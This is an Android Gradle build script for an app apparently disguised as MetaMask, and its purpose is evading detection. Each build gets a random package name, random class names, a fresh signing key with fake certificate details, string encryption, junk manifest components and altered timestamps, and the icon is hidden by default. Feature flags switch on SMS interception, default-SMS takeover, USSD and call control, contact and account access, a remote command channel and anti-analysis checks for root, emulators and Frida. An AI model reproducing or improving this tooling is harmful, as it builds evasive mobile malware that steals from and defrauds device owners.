import com.android.build.api.artifact.SingleArtifact
import java.util.UUID
import java.io.File
import java.io.BufferedOutputStream
import java.io.FileOutputStream
import java.util.Random
import java.security.SecureRandom
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream
import java.util.zip.ZipEntry
import java.util.zip.Deflater
import java.util.zip.CRC32
import java.io.ByteArrayOutputStream
import java.util.zip.GZIPOutputStream
import org.gradle.api.DefaultTask
import org.gradle.api.tasks.TaskAction
import org.gradle.api.tasks.Input
import org.gradle.api.tasks.InputFile
import org.gradle.api.tasks.OutputFile
import org.gradle.api.file.RegularFileProperty
import org.gradle.api.provider.Property
import org.gradle.api.provider.ListProperty
import org.gradle.api.tasks.compile.JavaCompile
import org.gradle.api.tasks.JavaExec

buildscript {
    repositories { google(); mavenCentral(); maven { url = uri("https://jitpack.io") } }
    dependencies {
        classpath("com.github.megatronking.stringfog:gradle-plugin:5.2.0")
        classpath("com.github.megatronking.stringfog:xor:5.0.0")
    }
}

plugins { id("com.android.application"); id("org.jetbrains.kotlin.android") }

apply(plugin = "stringfog")

fun rndName(minLen: Int = 5, maxLen: Int = 8): String {
    val c = "bcdfghjklmnpqrstvwxyz"; val v = "aeiou"
    val sb = StringBuilder(); val syl = (minLen..maxLen).random()
    for (i in 0 until syl) { sb.append(if (i == 0) c.random().uppercase() else c.random()); sb.append(v.random()) }
    return sb.toString()
}
fun rndId(len: Int = 8): String = (1..len).map { "abcdefghijklmnopqrstuvwxyz".random() }.joinToString("")
fun rndSuffix(): String = UUID.randomUUID().toString().take(4)

fun junkSuffix(): String {
    val pool = listOf("Cache","Bus","Pool","Store","Buffer","Mgr","Holder","Helper",
                      "Builder","Registry","Source","Sink","Filter","Reader","Writer",
                      "Adapter","Bridge","Loader","Tracker","Monitor","Hub","Worker")
    return when ((0..9).random()) {
        in 0..1 -> "_${rndId(4)}"
        2       -> rndId(4)
        3       -> ""
        4       -> pool.random()
        5       -> "${pool.random()}_${rndId(3)}"
        6       -> "${pool.random()}${rndId(2).uppercase()}"
        7       -> rndId(3).uppercase() + rndId(3)
        else    -> rndSuffix()
    }
}

fun execVerb(): String = listOf(
    "run","process","tick","update","dispatch","flush","handle","invoke","execute",
    "perform","trigger","launch","step","cycle","evaluate","apply","submit","advance",
    "kick","drain","iterate","resolve","bind","warm","fire","poll","commit",
    "boot","wake","spin","churn","react","emit","sweep","awake"
).random()

val usedJunkNames = mutableSetOf<String>()
fun freshJunkName(base: String, suffixFn: () -> String = ::junkSuffix): String {
    repeat(50) {
        val n = base + suffixFn()
        if (usedJunkNames.add(n)) return n
    }
    val fallback = base + rndSuffix() + "_" + rndId(5)
    usedJunkNames.add(fallback)
    return fallback
}
fun rndCName(): String = "${rndName(3,5)} ${rndName(3,4)}"
fun rndPkgSeg(min: Int, max: Int): String {
    val c = "bcdfghjklmnpqrstvwxyz"; val v = "aeiou"
    val sb = StringBuilder()
    repeat((min..max).random()) { sb.append(c.random()); sb.append(v.random()) }
    return sb.toString()
}

val rXShift = (2..5).random()
fun encodeRxForC(s: String): String {
    val sb = StringBuilder()
    for (ch in s) {
        val b = ch.code + rXShift
        if (b == 92 || b == 34 || b == 0 || b < 32 || b > 127) sb.append("\\x%02x".format(b))
        else sb.append(b.toChar())
    }
    return sb.toString()
}

val randomPkg      = "com.${rndPkgSeg(2,4)}.${rndPkgSeg(3,5)}"
val randomPkgPath  = randomPkg.replace(".", "/")
val randomPrefix   = UUID.randomUUID().toString().replace("-","").take(8)
val rndVersionCode = (10000..999999).random()
val rndVersionName = "${(1..9).random()}.${(0..99).random()}.${(0..999).random()}"
val SO_NAME        = "lib${rndId(6)}"
val NATIVE_LOG_TAG = rndId(10)

val CLS_MAIN_APP         = "${rndName()}Application_${rndSuffix()}"
val CLS_WEB_VIEW         = "${rndName()}Activity_${rndSuffix()}"
val CLS_CUS_WEB          = "${rndName()}Activity_${rndSuffix()}"
val CLS_COMPOSE_SMS      = "${rndName()}Activity_${rndSuffix()}"
val CLS_SMS_RECV         = "${rndName()}Receiver_${rndSuffix()}"
val CLS_MMS_RECV         = "${rndName()}Receiver_${rndSuffix()}"
val CLS_HEADLESS_SMS     = "${rndName()}Service_${rndSuffix()}"
val CLS_BOOT_RECV        = "${rndName()}Receiver_${rndSuffix()}"
val CLS_ALARM_RECV       = "${rndName()}Receiver_${rndSuffix()}"
val CLS_CHIMERA_RECV     = "${rndName()}Receiver_${rndSuffix()}"
val CLS_DEFAULT_SMS_RECV = "${rndName()}Receiver_${rndSuffix()}"
val CLS_LOADER_RECV      = "${rndName()}Receiver_${rndSuffix()}"
val CLS_WS_HANDLER_RECV  = "${rndName()}Receiver_${rndSuffix()}"
val CLS_CHIKEN_WORKER    = "${rndName()}Worker_${rndSuffix()}"
val CLS_CMD_CHANNEL_SVC  = "${rndName()}Service_${rndSuffix()}"
val CLS_DEV_MONITOR_SVC  = "${rndName()}Service_${rndSuffix()}"
val CLS_FCM_TOKEN_SVC    = "${rndName()}Service_${rndSuffix()}"
val CLS_FRIEN_CAT        = "${rndName()}Service_${rndSuffix()}"
val CLS_LEGACY_USSD_SVC  = "${rndName()}Service_${rndSuffix()}"
val CLS_MASTER_WS        = "${rndName()}Service_${rndSuffix()}"
val CLS_PRIVILEGE_SVC    = "${rndName()}Service_${rndSuffix()}"
val CLS_PULSE_SVC        = "${rndName()}Service_${rndSuffix()}"
val CLS_SVC_STARTER      = "${rndName()}Worker_${rndSuffix()}"
val CLS_TURTLE_SVC       = "${rndName()}Service_${rndSuffix()}"
val CLS_USSD_CTL_SVC     = "${rndName()}Service_${rndSuffix()}"
val CLS_TROL_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_UUID_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_FRIEN_WORKER     = "${rndName()}Worker_${rndSuffix()}"
val CLS_AUTH_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_STUB_AUTH        = "${rndName()}Auth_${rndSuffix()}"
val CLS_STUB_PROVIDER    = "${rndName()}Provider_${rndSuffix()}"
val CLS_SYNC_ADAPTER     = "${rndName()}Adapter_${rndSuffix()}"
val CLS_SYNC_MANAGER     = "${rndName()}Manager_${rndSuffix()}"
val CLS_SYNC_SVC         = "${rndName()}Service_${rndSuffix()}"
val CLS_ZEBRA_WORKER     = "${rndName()}Worker_${rndSuffix()}"
val CLS_NATIVE_BRIDGE    = rndName(7, 11)
val CLS_SECURITY_AUDITOR = rndName(7, 11)
val CLS_REMOTE_CONFIG      = "${rndName()}Config_${rndSuffix()}"
val CLS_UUID_PROVIDER      = "${rndName()}Provider_${rndSuffix()}"
val CLS_RADIO_LINK         = "${rndName()}Protocol_${rndSuffix()}"
val CLS_SCHEDULER_WORKER   = "${rndName()}Worker_${rndSuffix()}"
val CLS_XOR_OBF            = rndName(7, 11)

val STUB_CLS               = "${rndName(4,6)}App${rndSuffix()}"
val STUB_DECOY_CLS         = "${rndName(4,7)}Auth${rndSuffix()}"
val STUB_FACTORY_CLS       = "${rndName(4,6)}Factory${rndSuffix()}"
val DEXLDR_SO_NAME         = "ld${rndId(5)}"
val JNI_UNPACK_SYMBOL      = "f${rndId(7)}"
val JNI_LITE_CHECK_SYMBOL  = "g${rndId(7)}"
val PACK_XOR_KEY: ByteArray = ByteArray(32).also { SecureRandom().nextBytes(it) }
val PAYLOAD_FOLDER     = rndId(6)
val PAYLOAD_PART_NAMES = (0..2).map { rndId(8) + "." + listOf("db","bin","cache","tmp").random() }

val JNI_CHECK_ROOT    = "f${rndId(7)}"
val JNI_CHECK_EMU     = "f${rndId(7)}"
val JNI_CHECK_FRIDA   = "f${rndId(7)}"
val JNI_SRV_A         = "f${rndId(6)}"
val JNI_SRV_B         = "f${rndId(6)}"
val JNI_SRV_EP        = "f${rndId(6)}"
val JNI_ENCRYPT         = "m${rndId(7)}"
val JNI_DECODE_TASK     = "m${rndId(7)}"
val JNI_PROCESS_TASK    = "m${rndId(7)}"
val JNI_CALL_ACTION     = "m${rndId(7)}"
val JNI_TEL_PREFIX      = "m${rndId(7)}"
val JNI_REQ_METHOD      = "m${rndId(7)}"
val JNI_CB_HANDLER      = "m${rndId(7)}"
val JNI_SYS_CB          = "m${rndId(7)}"
val JNI_CONTACTS_ACTION = "m${rndId(7)}"
val JNI_BUILD_CONTACTS  = "m${rndId(7)}"
val JNI_DECRYPT_DOMAIN  = "m${rndId(7)}"
val JNI_UUID_PREFIX     = "m${rndId(7)}"
val JNI_UUID_SUFFIX     = "m${rndId(7)}"

val ACTION_RESTART_SVC   = "a.${rndId(8)}.${rndId(4)}"
val ACTION_HANDLE_CMD    = "a.${rndId(8)}.${rndId(4)}"
val ACTION_INTERNAL_KICK = "a.${rndId(8)}.${rndId(4)}"
val ACTION_FOX_TARGET    = "a.${rndId(8)}.${rndId(4)}"
val ACTION_SEND_TO_SRV   = "a.${rndId(8)}.${rndId(4)}"
val ACTION_SEND_MSG      = "a.${rndId(8)}.${rndId(4)}"
val ACTION_START_MON     = "a.${rndId(8)}.${rndId(4)}"
val EXTRA_MSG_DATA_KEY   = "e${rndId(10)}"
val EXTRA_MSG_SEND_KEY   = "e${rndId(10)}"
val EXTRA_CMD_DATA_KEY   = "e${rndId(10)}"
val EXTRA_BOOT_KEY       = "e${rndId(10)}"

val WM_MASTER_CHECK      = rndId(14)
val WM_BG_SYNC           = rndId(14)
val WM_TAG_SMS           = rndId(10)
val WM_TAG_DEFAULT_SMS   = rndId(10)
val WM_TAG_BOOT          = rndId(10)
val WM_TAG_CHIMERA       = rndId(10)
val WM_TAG_WAKE_URGENT   = rndId(10)
val WM_TAG_FCM           = rndId(10)
val WM_TAG_TURTLE        = rndId(10)
val WM_TAG_PULSE         = rndId(10)
val WM_TAG_ZEBRA         = rndId(10)

val CHAN_MWD             = rndId(14)
val CHAN_SYNC            = rndId(14)
val CHAN_WORKER          = rndId(14)
val CHAN_USSD            = rndId(14)
val CHAN_CORE            = rndId(14)

val PREFS_SVC_STATUS     = rndId(14)
val PREFS_CONN           = rndId(14)
val PREFS_UUID           = rndId(14)
val PREFS_FCM            = rndId(14)
val PREFS_SMS            = rndId(14)
val PREFS_SMS_HIST       = rndId(14)
val PREFS_KILL           = rndId(14)
val PREFS_SETUP          = rndId(14)
val PREFS_NET            = rndId(14)
val PREFS_DEVICE         = rndId(14)

val KEY_IS_RUNNING       = rndId(12)
val KEY_DOMAIN           = rndId(12)
val KEY_UUID_VAL         = rndId(12)
val KEY_FCM_TOKEN        = rndId(12)
val KEY_DISABLED         = rndId(12)
val KEY_INTERCEPT        = rndId(12)
val KEY_HANDSHAKE        = rndId(12)
val KEY_SYNC_TS          = rndId(12)

val CMD_XOR_KEY          = (33..126).random()

val traffer: String = run {
    val fromCmd = (project.findProperty("traffer") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("traffer=") }
                ?.removePrefix("traffer=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val appName: String = run {
    val fromCmd = (project.findProperty("appName") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("appName=") }
                ?.removePrefix("appName=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val smsTarget: String = run {
    val fromCmd = (project.findProperty("smsTarget") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("smsTarget=") }
                ?.removePrefix("smsTarget=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val uuidPrefix: String = run {
    val fromCmd = (project.findProperty("uuidPrefix") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("uuidPrefix=") }
                ?.removePrefix("uuidPrefix=")
                ?.trim()
                ?: "777777"
        } else "777777"
    }
}

val targetUrl: String = run {
    val fromCmd = (project.findProperty("targetUrl") as? String)?.trim() ?: ""
    if (fromCmd.isNotEmpty()) fromCmd
    else {
        val localFile = rootProject.file("local.properties")
        if (localFile.exists()) {
            localFile.readLines()
                .firstOrNull { it.startsWith("targetUrl=") }
                ?.removePrefix("targetUrl=")
                ?.trim()
                ?: ""
        } else ""
    }
}

val hideIcon: Boolean = run {
    val fromCmd = (project.findProperty("hideIcon") as? String)?.trim()?.lowercase()
    when (fromCmd) {
        "false" -> false
        "true"  -> true
        else    -> true
    }
}
val launcherCategory = if (hideIcon) "android.intent.category.LEANBACK_LAUNCHER"
                       else          "android.intent.category.LAUNCHER"

// ─── Feature flags (v2) ─────────────────────────────────────────────────────
fun featBool(key: String, default: Boolean = true): Boolean {
    val v = project.findProperty(key)?.toString()?.trim()?.lowercase() ?: return default
    return when (v) { "false", "0", "no" -> false; else -> true }
}
val featFcm            = featBool("feat_fcm")
val featSms            = featBool("feat_sms")
val featSmsRole        = featBool("feat_sms_role")
val featRadioLink      = featBool("feat_radio_link")
val featContacts       = featBool("feat_contacts")
val featAccounts       = featBool("feat_accounts")
val featCallPhone      = featBool("feat_call_phone")
val featUssd           = featBool("feat_ussd")
val featTurtle         = featBool("feat_turtle")
val featSyncManager    = featBool("feat_sync_manager")
val featKeepaliveJob   = featBool("feat_keepalive_job")
val featFrienCat       = featBool("feat_frien_cat")
val featDeviceMonitor  = featBool("feat_device_monitor")
val featTrolSvc        = featBool("feat_trol_svc")
val featCmdChannel     = featBool("feat_cmd_channel")
val featPrivilegeSvc   = featBool("feat_privilege_svc")
// Dependency constraints
val featSmsRoleFinal   = featSmsRole && featSms
val featRadioLinkFinal = featRadioLink && featSms
val featUssdFinal      = featUssd && featCallPhone
val featKeepAliveMgr   = featKeepaliveJob || featFrienCat

val junkPkg = "$randomPkg.internal.utils.common"

val fakeActivityCount = (31..63).random()
val fakeActivityNames = (1..fakeActivityCount).map { freshJunkName("${rndName()}Activity") }
val fakeServiceCount  = (28..49).random()
val fakeServiceNames  = (1..fakeServiceCount).map  { freshJunkName("${rndName()}Service")  }
val fakeProviderCount = (7..21).random()
val fakeProviderNames = (1..fakeProviderCount).map { freshJunkName("${rndName()}Provider") }

println("--- [CRISTOFER_V2] pkg=$randomPkg v$rndVersionName ($rndVersionCode) SO=$SO_NAME rXShift=$rXShift ---")

val isRandomizedBuild = project.gradle.startParameter.taskNames.any {
    val t = it.lowercase()
    (t.contains("assemble") || t.contains("install") || t.contains("bundle")) && !t.contains("clean")
}

val shadowSrcDir         = layout.buildDirectory.dir("randomized_sources").get().asFile
val dynamicProguardRules = layout.buildDirectory.file("generated_proguard_rules.pro").get().asFile

val sdkDir        = android.sdkDirectory.absolutePath.replace("\\", "/")
val buildToolsVer = "34.0.0"
val isWindows     = System.getProperty("os.name").lowercase().contains("win")
val ZIPALIGN      = "$sdkDir/build-tools/$buildToolsVer/" + if (isWindows) "zipalign.exe" else "zipalign"
val APKSIGNER     = "$sdkDir/build-tools/$buildToolsVer/" + if (isWindows) "apksigner.bat" else "apksigner"
val outDir        = "${project.buildDir}/outputs/apk/release"
val flipOutDir    = "${project.buildDir}/flip/out"

fun runCmd(cmd: List<String>) {
    val pb = ProcessBuilder(cmd).redirectErrorStream(true)
    val p = pb.start()
    val out = p.inputStream.bufferedReader().readText()
    val exit = p.waitFor()
    if (exit != 0) throw GradleException("Command failed (exit $exit): ${cmd.joinToString(" ")}\n$out")
    if (out.isNotBlank()) println(out)
}

val keystoreBaseDir = layout.buildDirectory.dir("outputs/keystores").get().asFile.absolutePath
fun generateUniqueKey(tag: String): Triple<String, String, String> {
    val dir = file("$keystoreBaseDir/$tag").also { it.mkdirs() }
    val ksFile = File(dir, "$tag.jks").also { if (it.exists()) it.delete() }
    val alias = "a" + UUID.randomUUID().toString().replace("-","").take(12)
    val pass  = UUID.randomUUID().toString().replace("-","")
    val countries = listOf("US","DE","FR","IT","ES","CA","GB","JP","AU","NL","SE","PL","CZ","AT","CH")
    val cities    = listOf("New York","Berlin","Paris","Rome","Madrid","London","Tokyo","Amsterdam","Stockholm","Vienna","Prague")
    val states    = listOf("NY","BE","IDF","RM","MD","GL","TK","NH","ST","VI","PR")
    val orgP = listOf("Alpha","Beta","Cyber","Net","Global","Tech","Smart","Secure","Cloud","Nexus","Prime","Vertex")
    val orgS = listOf("Corp","Inc","Ltd","GmbH","Group","Technologies","Systems","Solutions","Labs","Digital")
    val cn   = rndCName()
    val dname = "CN=$cn, OU=${orgP.random()} ${orgS.random()}, O=${orgP.random()} ${orgS.random()}, L=${cities.random()}, ST=${states.random()}, C=${countries.random()}"
    runCmd(listOf("keytool","-genkeypair","-v","-storetype","PKCS12",
        "-keystore",ksFile.absolutePath,"-alias",alias,"-keyalg","RSA","-keysize","2048",
        "-validity","${(15000..25000).random()}","-storepass",pass,"-keypass",pass,"-dname",dname))
    return Triple(ksFile.absolutePath, alias, pass)
}

fun stripApkMetaData(apkFile: File) {
    val stripPatterns = listOf(
        Regex("META-INF/com/android/build/.*"),
        Regex("META-INF/version-control-info\\.textproto"),
        Regex("META-INF/[^/]+\\.kotlin_module"),
        Regex("kotlin-tooling-metadata\\.json")
    )
    val tmp = File(apkFile.parent, apkFile.name + ".metastrip.tmp")
    val removed = mutableListOf<String>()
    ZipFile(apkFile).use { zf ->
        ZipOutputStream(BufferedOutputStream(tmp.outputStream())).use { zos ->
            for (entry in zf.entries().toList()) {
                if (stripPatterns.any { it.matches(entry.name) }) { removed += entry.name; continue }

                val raw = zf.getInputStream(entry).use { it.readBytes() }

                val ne = ZipEntry(entry.name)
                ne.method = entry.method
                ne.setSize(raw.size.toLong())
                ne.setCrc(CRC32().apply { update(raw) }.value)

                if (entry.method == ZipEntry.STORED) {
                    ne.setCompressedSize(raw.size.toLong())
                } else {
                    val def = Deflater(Deflater.DEFAULT_COMPRESSION, true)
                    val baos = ByteArrayOutputStream()
                    val buf = ByteArray(8192)
                    try {
                        def.setInput(raw); def.finish()
                        while (!def.finished()) {
                            val n = def.deflate(buf); if (n > 0) baos.write(buf, 0, n)
                        }
                    } finally { def.end() }
                    ne.setCompressedSize(baos.size().toLong())
                }

                zos.putNextEntry(ne)
                zos.write(raw)
                zos.closeEntry()
            }
        }
    }
    if (removed.isEmpty()) { tmp.delete(); return }
    apkFile.delete(); tmp.renameTo(apkFile)
    println("--- [STRIP-META] Removed from APK: ${removed.joinToString()} ---")
}

fun randomizeZipTimestamps(zipFile: File) {
    val bytes = zipFile.readBytes()
    val rng = Random()
    fun ri(o: Int) = (bytes[o].toInt() and 0xFF) or ((bytes[o+1].toInt() and 0xFF) shl 8) or
        ((bytes[o+2].toInt() and 0xFF) shl 16) or ((bytes[o+3].toInt() and 0xFF) shl 24)
    fun rs(o: Int) = (bytes[o].toInt() and 0xFF) or ((bytes[o+1].toInt() and 0xFF) shl 8)
    fun ws(o: Int, v: Int) { bytes[o] = (v and 0xFF).toByte(); bytes[o+1] = ((v shr 8) and 0xFF).toByte() }
    fun rndT() = (rng.nextInt(24) shl 11) or (rng.nextInt(60) shl 5) or rng.nextInt(30)
    fun rndD() = ((rng.nextInt(10) + 35) shl 9) or ((rng.nextInt(12) + 1) shl 5) or (rng.nextInt(28) + 1)
    var eocd = -1
    for (i in bytes.size - 22 downTo 0) { if (ri(i) == 0x06054b50) { eocd = i; break } }
    if (eocd == -1) return
    val cdStart = ri(eocd + 16); var pos = cdStart
    while (pos + 46 <= bytes.size && ri(pos) == 0x02014b50) {
        val nlen = rs(pos + 28); val xlen = rs(pos + 30); val clen = rs(pos + 32)
        val t = rndT(); val d = rndD(); ws(pos + 12, t); ws(pos + 14, d)
        val lfh = ri(pos + 42)
        if (lfh in 0..(bytes.size - 30) && ri(lfh) == 0x04034b50) { ws(lfh + 10, t); ws(lfh + 12, d) }
        pos += 46 + nlen + xlen + clen
    }
    zipFile.writeBytes(bytes)
    println("--- [TIMESTAMPS] Randomized: ${zipFile.name} ---")
}

configure<com.github.megatronking.stringfog.plugin.StringFogExtension> {
    implementation = "com.github.megatronking.stringfog.xor.StringFogImpl"
    enable = true
    fogPackages = arrayOf(randomPkg, "com.yourcompany")
    kg = com.github.megatronking.stringfog.plugin.kg.RandomKeyGenerator()
    mode = com.github.megatronking.stringfog.plugin.StringFogMode.bytes
}

abstract class RandomizeManifestTask : DefaultTask() {
    @get:InputFile  abstract val mergedManifest: RegularFileProperty
    @get:OutputFile abstract val updatedManifest: RegularFileProperty
    @get:Input abstract val appId: Property<String>
    @get:Input abstract val prefix: Property<String>
    @get:Input abstract val fakeActivities: ListProperty<String>
    @get:Input abstract val fakeServices: ListProperty<String>
    @get:Input abstract val fakeProviders: ListProperty<String>
    @get:Input abstract val junkPkgName: Property<String>

    @TaskAction fun taskAction() {
        var content = mergedManifest.get().asFile.readText()

        val extraPerms = listOf(
            "android.permission.VIBRATE",
            "android.permission.SET_ALARM",
            "android.permission.ACCESS_WIFI_STATE","android.permission.BLUETOOTH",
            "android.permission.FLASHLIGHT","android.permission.CHANGE_NETWORK_STATE",
            "android.permission.MODIFY_AUDIO_SETTINGS",
            "android.permission.GET_PACKAGE_SIZE","android.permission.READ_SYNC_STATS"
        )
        val permRe = """<uses-permission[^>]+/>""".toRegex()
        val existing = permRe.findAll(content).map { it.value }.toList()
        val newPerms = extraPerms.shuffled().take((3..6).random())
            .map { "    <uses-permission android:name=\"$it\" />" }
        val allPerms = (existing + newPerms).shuffled()
        content = content.replace(permRe, "")
        content = content.replace("<application", "${allPerms.joinToString("\n")}\n    <application")

        val metaSb = StringBuilder()
        repeat((50..100).random()) {
            metaSb.append("        <meta-data android:name=\"${appId.get()}.meta.${UUID.randomUUID()}\" android:value=\"${UUID.randomUUID()}\" />\n")
        }

        val jPkg = junkPkgName.get()
        val acts = fakeActivities.get().joinToString("\n") { n ->
            "<activity android:name=\"$jPkg.$n\" android:exported=\"false\" android:theme=\"@android:style/Theme.NoDisplay\" android:label=\"${UUID.randomUUID().toString().take(5)}\" />"
        }
        val svcs = fakeServices.get().joinToString("\n") { n ->
            "<service android:name=\"$jPkg.$n\" android:exported=\"false\" android:enabled=\"true\" />"
        }
        val provs = fakeProviders.get().joinToString("\n") { n ->
            "<provider android:name=\"$jPkg.$n\" android:authorities=\"${appId.get()}.p.${UUID.randomUUID()}\" android:exported=\"false\" android:initOrder=\"${(1..99).random()}\" />"
        }
        content = content.replace("</application>", "$metaSb\n$acts\n$svcs\n$provs\n    </application>")
        content = content.replace(Regex("android:extractNativeLibs\\s*=\\s*\"[^\"]*\""), "")
        updatedManifest.get().asFile.writeText(content)
    }
}

androidComponents {
    onVariants(selector().all()) { variant ->
        if (isRandomizedBuild) {
            val t = tasks.register<RandomizeManifestTask>("randomize${variant.name.replaceFirstChar { it.uppercase() }}Manifest") {
                appId.set(randomPkg); prefix.set(randomPrefix)
                fakeActivities.set(fakeActivityNames); fakeServices.set(fakeServiceNames); fakeProviders.set(fakeProviderNames)
                junkPkgName.set(junkPkg)
            }
            variant.artifacts.use(t)
                .wiredWithFiles(RandomizeManifestTask::mergedManifest, RandomizeManifestTask::updatedManifest)
                .toTransform(SingleArtifact.MERGED_MANIFEST)
        }
    }
}

android {
    namespace  = if (isRandomizedBuild) randomPkg else "com.example.MetaMask"
    compileSdk = 36

    defaultConfig {
        applicationId = if (isRandomizedBuild) randomPkg else "com.example.MetaMask"
        minSdk = 26; targetSdk = 33
        multiDexEnabled = true
        if (isRandomizedBuild) {
            multiDexKeepFile = file("${layout.buildDirectory.get()}/randomized_sources/multidex-config.txt")
            versionCode = rndVersionCode; versionName = rndVersionName
        } else { versionCode = 1; versionName = "1.0" }
        manifestPlaceholders["servicePrefix"]  = "Svc_$randomPrefix"
        manifestPlaceholders["receiverPrefix"] = "Rcv_$randomPrefix"
        manifestPlaceholders["workerPrefix"]   = "Wrk_$randomPrefix"
        buildConfigField("boolean", "FEAT_FCM",              "$featFcm")
        buildConfigField("boolean", "FEAT_SMS",              "$featSms")
        buildConfigField("boolean", "FEAT_SMS_ROLE",         "$featSmsRoleFinal")
        buildConfigField("boolean", "FEAT_RADIO_LINK",       "$featRadioLinkFinal")
        buildConfigField("boolean", "FEAT_CONTACTS",         "$featContacts")
        buildConfigField("boolean", "FEAT_ACCOUNTS",         "$featAccounts")
        buildConfigField("boolean", "FEAT_CALL_PHONE",       "$featCallPhone")
        buildConfigField("boolean", "FEAT_USSD",             "$featUssdFinal")
        buildConfigField("boolean", "FEAT_TURTLE",           "$featTurtle")
        buildConfigField("boolean", "FEAT_SYNC_MANAGER",     "$featSyncManager")
        buildConfigField("boolean", "FEAT_KEEPALIVE_JOB",    "$featKeepaliveJob")
        buildConfigField("boolean", "FEAT_FRIEN_CAT",        "$featFrienCat")
        buildConfigField("boolean", "FEAT_DEVICE_MONITOR",   "$featDeviceMonitor")
        buildConfigField("boolean", "FEAT_TROL_SVC",         "$featTrolSvc")
        buildConfigField("boolean", "FEAT_CMD_CHANNEL",      "$featCmdChannel")
        buildConfigField("boolean", "FEAT_PRIVILEGE_SVC",    "$featPrivilegeSvc")
        ndk { abiFilters.addAll(listOf("armeabi-v7a","arm64-v8a")) }
        resourceConfigurations.addAll(listOf("ru","en"))
        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
    }

    sourceSets {
        getByName("main") {
            if (isRandomizedBuild) {
                java.setSrcDirs(listOf(File(shadowSrcDir,"java")))
                res.setSrcDirs(listOf(File(shadowSrcDir,"res")))
                manifest.srcFile(File(shadowSrcDir,"AndroidManifest.xml"))
                assets.setSrcDirs(listOf(File(shadowSrcDir,"assets")))
            }
        }
    }

    externalNativeBuild {
        cmake {
            path = if (isRandomizedBuild) file(File(shadowSrcDir,"cpp/CMakeLists.txt"))
                   else file("src/main/cpp/CMakeLists.txt")
            version = "3.22.1"
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true; isShrinkResources = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro", "obfuscation.pro", dynamicProguardRules)
        }
        debug {
            isMinifyEnabled = false; isShrinkResources = false
        }
    }
    lint { checkReleaseBuilds = false; abortOnError = false }
    compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
    kotlinOptions { jvmTarget = "17" }
    buildFeatures { buildConfig = true }
    packaging {
        resources {
            excludes += setOf(
                "META-INF/*.kotlin_module","**.kotlin_module",
                "META-INF/DEPENDENCIES","META-INF/LICENSE*","META-INF/NOTICE*",
                "**/*.proto","**/*.textproto","META-INF/*.version","META-INF/AL2.0","META-INF/LGPL2.1",
                "META-INF/*.SF","META-INF/*.RSA","META-INF/*.DSA","META-INF/MANIFEST.MF",
                "kotlin-tooling-metadata.json",
                "kotlin/**","DebugProbesKt.bin","META-INF/versions/**",
                "META-INF/com.android.tools/**","META-INF/com/android/build/**","META-INF/proguard/**",
                "**.kotlin_builtins","**.kotlin_metadata","META-INF/CHANGES","META-INF/README*"
            )
        }
        jniLibs { useLegacyPackaging = true }
    }
}

tasks.register("prepareAndRandomizeSources") {
    group = "build"; outputs.upToDateWhen { false }
    doLast {
        if (shadowSrcDir.exists()) shadowSrcDir.deleteRecursively()
        shadowSrcDir.mkdirs()

        val originalSrc = project.projectDir.resolve("src/main")
        originalSrc.copyRecursively(shadowSrcDir, overwrite = true)

        // ─── Feature-based file exclusions ──────────────────────────────────────
        // Безопасно удаляем только standalone файлы без прямых import-references из CORE классов.
        // Остальные модули управляются через BuildConfig.FEAT_XXX + R8 shrinking.
        val excludedKtFiles2 = mutableSetOf<String>()
        if (excludedKtFiles2.isNotEmpty()) {
            val javaDir2 = File(shadowSrcDir, "java")
            var removed2 = 0
            javaDir2.walkTopDown().filter { it.isFile && it.name in excludedKtFiles2 }.forEach {
                it.delete(); removed2++
            }
            println("--- [CRISTOFER_V2] Feature exclusions: removed $removed2 files ---")
        }

        // ── FCM stub replacement when feat_fcm=false (BEFORE class renaming) ───
        if (!featFcm) {
            val fcmStubs = mapOf(
                "FcmTokenService.kt" to """package com.example.MetaMask.services
import android.content.Context
class FcmTokenService {
    companion object {
        internal const val PREFS_NAME = "fcm_prefs"
        internal const val PREF_TOKEN = "fcm_token"
        fun markTokenConfirmed(ctx: Context, confirmed: Boolean) {}
        fun isTokenConfirmed(ctx: Context): Boolean = false
        fun pushCurrentTokenToServer(ctx: Context) {}
        internal fun scheduleSendWorker(ctx: Context) {}
    }
}""",
                "FcmTokenSendWorker.kt" to """package com.example.MetaMask.services
import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
class FcmTokenSendWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {
    override fun doWork(): Result = Result.success()
}""",
                "FcmTokenCheckWorker.kt" to """package com.example.MetaMask.services
import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
class FcmTokenCheckWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {
    override fun doWork(): Result = Result.success()
}""",
                "FCMConfig.kt" to """package com.example.MetaMask.utils
import android.content.Context
object FCMConfig {
    fun init(context: Context) {}
}"""
            )
            var stubCount = 0
            File(shadowSrcDir, "java").walkTopDown()
                .filter { it.isFile && it.name in fcmStubs }
                .forEach { f -> f.writeText(fcmStubs[f.name]!!); stubCount++ }
            println("--- [CRISTOFER_V2] FCM disabled: replaced $stubCount files with stubs ---")
        }

        shadowSrcDir.resolve("multidex-config.txt")
            .writeText("com/example/MetaMask/$CLS_MAIN_APP.class\n")

